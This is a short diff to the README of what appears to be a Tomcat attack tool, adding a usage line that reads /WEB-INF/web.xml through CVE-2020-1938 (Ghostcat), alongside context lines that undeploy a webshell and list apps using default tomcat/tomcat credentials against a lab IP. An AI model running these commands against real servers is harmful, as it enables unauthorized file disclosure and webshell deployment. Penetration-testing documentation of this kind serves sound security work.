@@ -71,6 +71,11 @@ $ python tomcat.py undeploy -u tomcat -p tomcat /webshell 172.17.0.2
 $ python tomcat.py list -u tomcat -p tomcat 172.17.0.2
 ```
 
+* Reading file using CVE-2020-1938
+```
+$ python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 172.17.0.2
+```
+
 
 # Thanks
 * @MrTchuss for the Tomcat WAR upload fix
